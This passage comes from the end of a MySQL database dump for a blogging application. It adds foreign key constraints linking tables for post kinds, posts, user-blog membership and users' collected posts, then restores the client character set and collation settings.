  ADD CONSTRAINT `kind_ibfk_1` FOREIGN KEY (`parent_id`) REFERENCES `kind` (`id`);

--
-- Constraints for table `post`
--
ALTER TABLE `post`
  ADD CONSTRAINT `post_ibfk_1` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`);

--
-- Constraints for table `user_blog`
--
ALTER TABLE `user_blog`
  ADD CONSTRAINT `user_blog_ibfk_1` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`),
  ADD CONSTRAINT `user_blog_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`);

--
-- Constraints for table `user_collect_post`
--
ALTER TABLE `user_collect_post`
  ADD CONSTRAINT `user_collect_post_ibfk_1` FOREIGN KEY (`post_id`) REFERENCES `post` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `user_collect_post_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
